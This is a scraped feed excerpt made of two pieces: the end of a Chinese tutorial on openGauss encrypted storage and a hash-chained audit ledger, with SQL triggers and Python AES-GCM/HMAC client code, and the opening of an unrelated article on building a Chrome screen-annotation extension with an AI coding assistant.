<span class="hljs-comment">-- name_ct/phone_ct：AES-GCM 密文（密钥/nonce 在客户端管理，不入库）  </span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> secure.user_info_secure (  
    id          BIGSERIAL <span class="hljs-keyword">PRIMARY</span> KEY,  
    name_hash   <span class="hljs-type">CHAR</span>(<span class="hljs-number">64</span>)        <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,     <span class="hljs-comment">-- 64位十六进制串（示例用 SHA-256 的 hex）  </span>
    name_ct     BYTEA           <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,     <span class="hljs-comment">-- 姓名密文  </span>
    phone_ct    BYTEA           <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,     <span class="hljs-comment">-- 手机密文  </span>
    created_at  <span class="hljs-type">TIMESTAMP</span>       <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> now()  
);  
   
<span class="hljs-comment">-- 等值查询索引（命中 name_hash）  </span>
<span class="hljs-keyword">CREATE</span> INDEX idx_user_info_name_hash <span class="hljs-keyword">ON</span> secure.user_info_secure (name_hash);  
</code></pre>
<h4 data-id="heading-11">2)  <strong><strong><strong>账本表（链式哈希，防篡改）</strong></strong></strong></h4>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-comment">-- 简洁的账本表：每条业务变更都会记一条 “区块”  </span>
<span class="hljs-comment">-- prev_hash 串起链路，curr_hash 为本次区块哈希（含前一个区块哈希、当前行摘要、时间戳等）  </span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> secure.audit_ledger (  
    block_id    BIGSERIAL <span class="hljs-keyword">PRIMARY</span> KEY,  
    table_name  TEXT        <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,  
    op          TEXT        <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,       <span class="hljs-comment">-- INSERT / UPDATE / DELETE  </span>
    row_pk      <span class="hljs-type">BIGINT</span>      <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,       <span class="hljs-comment">-- 目标行主键（user_info_secure.id）  </span>
    row_digest  <span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>)    <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,       <span class="hljs-comment">-- 该行摘要（使用 md5 以避免扩展依赖）  </span>
    prev_hash   <span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>)    <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,  
    curr_hash   <span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>)    <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,  
    op_at       <span class="hljs-type">TIMESTAMP</span>   <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> now()  
);  
   
<span class="hljs-comment">-- 保存全局“上一个区块哈希”；我们用一张仅 1 行的小表做“链头指针”  </span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> secure.audit_head (  
    id      <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY</span> KEY,  
    tip     <span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>        <span class="hljs-comment">-- 最新区块哈希  </span>
);  
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> secure.audit_head (id, tip) <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, md5(<span class="hljs-string">'genesis'</span>));  <span class="hljs-comment">-- 创世 tip </span>
</code></pre>
<h4 data-id="heading-12">3)  <strong><strong><strong>触发器：自动写账本区块</strong></strong></strong></h4>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-comment">-- 生成当前行的摘要（把关键字段序列化后 md5）  </span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">FUNCTION</span> secure.digest_user_row(_id <span class="hljs-type">BIGINT</span>, _name_ct BYTEA, _phone_ct BYTEA)  
<span class="hljs-keyword">RETURNS</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>)  
<span class="hljs-keyword">LANGUAGE</span> plpgsql <span class="hljs-keyword">AS</span> $$  
<span class="hljs-keyword">DECLARE</span>  
  s TEXT;  
<span class="hljs-keyword">BEGIN</span>  
  <span class="hljs-comment">-- 注意：我们不把密钥相关信息落库；仅对密文进行摘要  </span>
  s :<span class="hljs-operator">=</span> _id <span class="hljs-operator">||</span> <span class="hljs-string">':'</span> <span class="hljs-operator">||</span> encode(_name_ct, <span class="hljs-string">'hex'</span>) <span class="hljs-operator">||</span> <span class="hljs-string">':'</span> <span class="hljs-operator">||</span> encode(_phone_ct, <span class="hljs-string">'hex'</span>);  
  <span class="hljs-keyword">RETURN</span> md5(s);  
<span class="hljs-keyword">END</span>;  
$$;  
   
<span class="hljs-comment">-- 写入账本区块：prev_hash = audit_head.tip；curr_hash = md5(prev_hash || row_digest || op || now)  </span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">FUNCTION</span> secure.append_ledger(_tbl TEXT, _op TEXT, _pk <span class="hljs-type">BIGINT</span>, _row_digest <span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>))  
<span class="hljs-keyword">RETURNS</span> VOID  
<span class="hljs-keyword">LANGUAGE</span> plpgsql <span class="hljs-keyword">AS</span> $$  
<span class="hljs-keyword">DECLARE</span>  
  prev <span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>);  
  now_hash <span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>);  
<span class="hljs-keyword">BEGIN</span>  
  <span class="hljs-keyword">SELECT</span> tip <span class="hljs-keyword">INTO</span> prev <span class="hljs-keyword">FROM</span> secure.audit_head <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">UPDATE</span>;  
  now_hash :<span class="hljs-operator">=</span> md5(prev <span class="hljs-operator">||</span> _row_digest <span class="hljs-operator">||</span> _op <span class="hljs-operator">||</span> now()::text);  
   
  <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> secure.audit_ledger(table_name,op,row_pk,row_digest,prev_hash,curr_hash)  
  <span class="hljs-keyword">VALUES</span>(_tbl,_op,_pk,_row_digest,prev,now_hash);  
   
  <span class="hljs-keyword">UPDATE</span> secure.audit_head <span class="hljs-keyword">SET</span> tip <span class="hljs-operator">=</span> now_hash <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;  
<span class="hljs-keyword">END</span>;  
$$;  
   
<span class="hljs-comment">-- 三类 DML 的行级触发器  </span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">FUNCTION</span> secure.tg_user_info_ledger()  
<span class="hljs-keyword">RETURNS</span> <span class="hljs-keyword">TRIGGER</span>  
<span class="hljs-keyword">LANGUAGE</span> plpgsql <span class="hljs-keyword">AS</span> $$  
<span class="hljs-keyword">DECLARE</span>  
  d <span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>);  
<span class="hljs-keyword">BEGIN</span>  
  IF TG_OP <span class="hljs-operator">=</span> <span class="hljs-string">'INSERT'</span> <span class="hljs-keyword">THEN</span>  
    d :<span class="hljs-operator">=</span> secure.digest_user_row(NEW.id, NEW.name_ct, NEW.phone_ct);  
    PERFORM secure.append_ledger(<span class="hljs-string">'user_info_secure'</span>,<span class="hljs-string">'INSERT'</span>,NEW.id,d);  
    <span class="hljs-keyword">RETURN</span> <span class="hljs-keyword">NEW</span>;  
  ELSIF TG_OP <span class="hljs-operator">=</span> <span class="hljs-string">'UPDATE'</span> <span class="hljs-keyword">THEN</span>  
    d :<span class="hljs-operator">=</span> secure.digest_user_row(NEW.id, NEW.name_ct, NEW.phone_ct);  
    PERFORM secure.append_ledger(<span class="hljs-string">'user_info_secure'</span>,<span class="hljs-string">'UPDATE'</span>,NEW.id,d);  
    <span class="hljs-keyword">RETURN</span> <span class="hljs-keyword">NEW</span>;  
  ELSIF TG_OP <span class="hljs-operator">=</span> <span class="hljs-string">'DELETE'</span> <span class="hljs-keyword">THEN</span>  
    d :<span class="hljs-operator">=</span> secure.digest_user_row(OLD.id, OLD.name_ct, OLD.phone_ct);  
    PERFORM secure.append_ledger(<span class="hljs-string">'user_info_secure'</span>,<span class="hljs-string">'DELETE'</span>,OLD.id,d);  
    <span class="hljs-keyword">RETURN</span> <span class="hljs-keyword">OLD</span>;  
  <span class="hljs-keyword">END</span> IF;  
<span class="hljs-keyword">END</span>;  
$$;  
   
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span> trg_user_info_ledger  
AFTER <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">ON</span> secure.user_info_secure  
<span class="hljs-keyword">FOR</span> <span class="hljs-keyword">EACH</span> <span class="hljs-type">ROW</span> <span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">FUNCTION</span> secure.tg_user_info_ledger();  
</code></pre>
<h3 data-id="heading-13"><strong>三、</strong> <strong><strong><strong>验证/审计工具 SQL（链式自校验）</strong></strong></strong></h3>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-comment">-- 1) 检查链路是否连续（curr_hash-&gt;prev_hash）  </span>
<span class="hljs-keyword">WITH</span> <span class="hljs-keyword">RECURSIVE</span> chain <span class="hljs-keyword">AS</span> (  
  <span class="hljs-keyword">SELECT</span> block_id, prev_hash, curr_hash  
  <span class="hljs-keyword">FROM</span> secure.audit_ledger  
  <span class="hljs-keyword">WHERE</span> block_id <span class="hljs-operator">=</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">min</span>(block_id) <span class="hljs-keyword">FROM</span> secure.audit_ledger)  
  <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>  
  <span class="hljs-keyword">SELECT</span> l.block_id, l.prev_hash, l.curr_hash  
  <span class="hljs-keyword">FROM</span> secure.audit_ledger l  
  <span class="hljs-keyword">JOIN</span> chain c <span class="hljs-keyword">ON</span> l.prev_hash <span class="hljs-operator">=</span> c.curr_hash  
)  
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> blocks_on_chain, (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> secure.audit_ledger) <span class="hljs-keyword">AS</span> total_blocks  
<span class="hljs-keyword">FROM</span> chain;  
   
<span class="hljs-comment">-- 2) 重算每个区块的 curr_hash 并比对，检测是否被篡改  </span>
<span class="hljs-keyword">SELECT</span> block_id,  
       curr_hash <span class="hljs-keyword">AS</span> stored,  
       md5(prev_hash <span class="hljs-operator">||</span> row_digest <span class="hljs-operator">||</span> op <span class="hljs-operator">||</span> op_at::text) <span class="hljs-keyword">AS</span> recomputed,  
       (curr_hash <span class="hljs-operator">=</span> md5(prev_hash <span class="hljs-operator">||</span> row_digest <span class="hljs-operator">||</span> op <span class="hljs-operator">||</span> op_at::text)) <span class="hljs-keyword">AS</span> ok  
<span class="hljs-keyword">FROM</span> secure.audit_ledger  
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> block_id;  
</code></pre>
<h3 data-id="heading-14">四、 <strong>业务侧密态等值查询：Python 端完整代码</strong></h3>
<p>采用 cryptography 实现 <strong>AES-256-GCM</strong>；</p>
<p><strong>HMAC-SHA256</strong> 生成 name_hash（等值检索键，可重复、不可逆，用于 WHERE 匹配）；</p>
<p>明文<strong>只在客户端内存</strong>出现，openGauss <strong>仅保存密文</strong>与 hash。
 </p>
<pre><code class="hljs language-sql" lang="sql"># requirements:  
#   pip install psycopg2<span class="hljs-operator">-</span><span class="hljs-type">binary</span> cryptography  
   
import os  
import hmac  
import hashlib  
import secrets  
import psycopg2  
<span class="hljs-keyword">from</span> cryptography.hazmat.primitives.ciphers.aead import AESGCM  
   
DSN <span class="hljs-operator">=</span> "dbname=secure_demo user=omm password=YourPass host=127.0.0.1 port=5432"  
   
# <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span> 客户端密钥（Demo：本地环境变量<span class="hljs-operator">/</span>文件；生产环境请接入 KMS<span class="hljs-operator">/</span>TEE） <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>  
# 数据加密密钥（DEK） <span class="hljs-operator">&amp;</span> HMAC 密钥  
DEK <span class="hljs-operator">=</span> os.environ.get("DEK_HEX") <span class="hljs-keyword">or</span> secrets.token_hex(<span class="hljs-number">32</span>)   # <span class="hljs-number">32</span> bytes <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> AES<span class="hljs-number">-256</span>  
HMK <span class="hljs-operator">=</span> os.environ.get("HMK_HEX") <span class="hljs-keyword">or</span> secrets.token_hex(<span class="hljs-number">32</span>)   # <span class="hljs-number">32</span> bytes <span class="hljs-keyword">for</span> HMAC<span class="hljs-operator">-</span>SHA256  
   
aesgcm <span class="hljs-operator">=</span> AESGCM(bytes.fromhex(DEK))  
hmac_key <span class="hljs-operator">=</span> bytes.fromhex(HMK)  
   
def hmac_sha256_hex(msg: bytes) <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> str:  
    <span class="hljs-keyword">return</span> hmac.new(hmac_key, msg, hashlib.sha256).hexdigest()  
   
def aes_gcm_encrypt(plaintext: bytes) <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> bytes:  
    nonce <span class="hljs-operator">=</span> secrets.token_bytes(<span class="hljs-number">12</span>)  # GCM 标准 <span class="hljs-number">96</span><span class="hljs-operator">-</span>bit nonce  
    ct <span class="hljs-operator">=</span> aesgcm.encrypt(nonce, plaintext, associated_data<span class="hljs-operator">=</span><span class="hljs-keyword">None</span>)  
    <span class="hljs-keyword">return</span> nonce <span class="hljs-operator">+</span> ct  # 拼接存库：nonce<span class="hljs-operator">|</span>ciphertext<span class="hljs-operator">|</span>tag  
   
def aes_gcm_decrypt(<span class="hljs-type">blob</span>: bytes) <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> bytes:  
    nonce, ct <span class="hljs-operator">=</span> <span class="hljs-type">blob</span>[:<span class="hljs-number">12</span>], <span class="hljs-type">blob</span>[<span class="hljs-number">12</span>:]  
    <span class="hljs-keyword">return</span> aesgcm.decrypt(nonce, ct, associated_data<span class="hljs-operator">=</span><span class="hljs-keyword">None</span>)  
   
def insert_user(name: str, phone: str):  
    name_hash <span class="hljs-operator">=</span> hmac_sha256_hex(name.encode("utf-8"))  
    name_ct   <span class="hljs-operator">=</span> aes_gcm_encrypt(name.encode("utf-8"))  
    phone_ct  <span class="hljs-operator">=</span> aes_gcm_encrypt(phone.encode("utf-8"))  
    <span class="hljs-keyword">with</span> psycopg2.connect(DSN) <span class="hljs-keyword">as</span> conn, conn.cursor() <span class="hljs-keyword">as</span> cur:  
        cur.execute("""  
            INSERT INTO secure.user_info_secure (name_hash, name_ct, phone_ct)  
            VALUES (%s, %s, %s)  
            RETURNING id;  
        """, (name_hash, psycopg2.Binary(name_ct), psycopg2.Binary(phone_ct)))  
        uid <span class="hljs-operator">=</span> cur.fetchone()[<span class="hljs-number">0</span>]  
        print(f"insert ok, id={uid}")  
   
def query_user_by_name(name: str):  
    name_hash <span class="hljs-operator">=</span> hmac_sha256_hex(name.encode("utf-8"))  
    <span class="hljs-keyword">with</span> psycopg2.connect(DSN) <span class="hljs-keyword">as</span> conn, conn.cursor() <span class="hljs-keyword">as</span> cur:  
        cur.execute("""  
            SELECT id, name_ct, phone_ct, created_at  
            FROM secure.user_info_secure  
            WHERE name_hash = %s  
            ORDER BY id;  
        """, (name_hash,))  
        <span class="hljs-keyword">rows</span> <span class="hljs-operator">=</span> cur.fetchall()  
        <span class="hljs-keyword">result</span> <span class="hljs-operator">=</span> []  
        <span class="hljs-keyword">for</span> uid, name_ct, phone_ct, ts <span class="hljs-keyword">in</span> <span class="hljs-keyword">rows</span>:  
            name_pt  <span class="hljs-operator">=</span> aes_gcm_decrypt(bytes(name_ct)).decode("utf-8")  
            phone_pt <span class="hljs-operator">=</span> aes_gcm_decrypt(bytes(phone_ct)).decode("utf-8")  
            result.append((uid, name_pt, phone_pt, ts))  
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">result</span>  
   
def update_phone(name: str, new_phone: str):  
    name_hash <span class="hljs-operator">=</span> hmac_sha256_hex(name.encode("utf-8"))  
    phone_ct  <span class="hljs-operator">=</span> aes_gcm_encrypt(new_phone.encode("utf-8"))  
    <span class="hljs-keyword">with</span> psycopg2.connect(DSN) <span class="hljs-keyword">as</span> conn, conn.cursor() <span class="hljs-keyword">as</span> cur:  
        cur.execute("""  
            UPDATE secure.user_info_secure  
               SET phone_ct = %s  
             WHERE name_hash = %s;  
        """, (psycopg2.Binary(phone_ct), name_hash))  
        print(f"update rows = {cur.rowcount}")  
   
def delete_user(name: str):  
    name_hash <span class="hljs-operator">=</span> hmac_sha256_hex(name.encode("utf-8"))  
    <span class="hljs-keyword">with</span> psycopg2.connect(DSN) <span class="hljs-keyword">as</span> conn, conn.cursor() <span class="hljs-keyword">as</span> cur:  
        cur.execute("DELETE FROM secure.user_info_secure WHERE name_hash=%s;", (name_hash,))  
        print(f"delete rows = {cur.rowcount}")  
   
if __name__ <span class="hljs-operator">=</span><span class="hljs-operator">=</span> "__main__":  
    # 写入两条密态数据  
    insert_user("张三", "13800000001")  
    insert_user("李四", "13800000002")  
   
    # 等值查询（库端匹配 hash，客户端解密展示）  
    print("查询 张三：", query_user_by_name("张三"))  
   
    # 更新与删除（触发器会自动写账本区块）  
    update_phone("张三", "13912345678")  
    print("查询 张三：", query_user_by_name("张三"))  
   
    delete_user("李四")  
</code></pre>
<h4 data-id="heading-15"><strong>运行结果</strong></h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">insert</span> ok, id<span class="hljs-operator">=</span><span class="hljs-number">1</span>  
<span class="hljs-keyword">insert</span> ok, id<span class="hljs-operator">=</span><span class="hljs-number">2</span>  
查询 张三： [(<span class="hljs-number">1</span>, <span class="hljs-string">'张三'</span>, <span class="hljs-string">'13800000001'</span>, datetime.datetime(<span class="hljs-number">2025</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">33</span>, <span class="hljs-number">47</span>, ...))]  
<span class="hljs-keyword">update</span> <span class="hljs-keyword">rows</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>  
查询 张三： [(<span class="hljs-number">1</span>, <span class="hljs-string">'张三'</span>, <span class="hljs-string">'13912345678'</span>, datetime.datetime(<span class="hljs-number">2025</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">33</span>, <span class="hljs-number">47</span>, ...))]  
<span class="hljs-keyword">delete</span> <span class="hljs-keyword">rows</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>  
</code></pre>
<h2 data-id="heading-16"><strong>结语</strong></h2>
<p>openGauss 通过 <strong>全密态计算 + 账本数据库 + TEE 硬件安全，</strong> 构建了可实现“<strong>数据不解密可计算，交易全程可追溯</strong>”的数据库安全体系。它不仅满足政务、金融、能源等行业的高安全需求，更为 AI 大模型提供了安全可信的数据底座。未来，openGauss 将成为云上“可信计算 + 数据智能”融合的关键引擎，让数据真正做到：“<strong>可用不可见，可查可证，可控可审。</strong> ”</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 驱动下的 Google Chrome 扩展快速开发实践：以屏幕标注工具的实现为例🧣]]></title>    <link>https://juejin.cn/post/7575230119104299049</link>    <guid>https://juejin.cn/post/7575230119104299049</guid>    <pubDate>2025-11-22T15:20:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575230119104299049" data-draft-id="7575320672570851370" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 驱动下的 Google Chrome 扩展快速开发实践：以屏幕标注工具的实现为例🧣"/> <meta itemprop="keywords" content="代码规范"/> <meta itemprop="datePublished" content="2025-11-22T15:20:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="围巾哥萧尘"/> <meta itemprop="url" content="https://juejin.cn/user/1222312659548446"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 驱动下的 Google Chrome 扩展快速开发实践：以屏幕标注工具的实现为例🧣
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1222312659548446/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    围巾哥萧尘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T15:20:13.000Z" title="Sat Nov 22 2025 15:20:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">AI 驱动下的 Google Chrome 扩展快速开发实践：以屏幕标注工具的实现为例🧣</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae0162f86a6748dc9aac6e114d771e22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu05be-5ZOl6JCn5bCY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764429949&amp;x-signature=G1d%2BxE8wRHYZXiPGPZ4cY8joewk%3D" alt="截屏2025-11-22 23.18.48.png" loading="lazy"/></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1P7U4BiED2%2F%3Fspm_id_from%3D333.1387.homepage.video_card.click" target="_blank" title="https://www.bilibili.com/video/BV1P7U4BiED2/?spm_id_from=333.1387.homepage.video_card.click" ref="nofollow noopener noreferrer">CCF程序员大会码力全开：方向1-工具提效-屏幕标注工具 | 围巾哥萧尘🧣</a></p>
<p><strong>作者：</strong> 围巾哥萧尘</p>
<p><strong>摘要：</strong> 本文记录了利用百度文心快码（Comate）参与 CCCF 大会“马力全开 AI 加速”活动的作品开发过程。该项目目标是解决日常工作中的信息反馈效率问题，聚焦于<strong>工具提效</strong>方向。通过 AI 加速开发，在<strong>大约两天的时间</strong>内，成功完成了一款功能强大的 Google Chrome 屏幕标注扩展插件的开发与迭代。本文重点阐述了从简洁提示词到功能实现的整个过程，以及在调试和优化中遇到的核心技术问题及其解决办法。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a7b42f8aacb4b3d940da85632bfce19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu05be-5ZOl6JCn5bCY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764429949&amp;x-signature=MTp3djQ7pzohPSwtIlWM4wIJOxw%3D" alt="截屏2025-11-22 23.12.18.png" loading="lazy"/></p>
<hr/>
<h4 data-id="heading-1">一、 引言（Introduction）</h4>
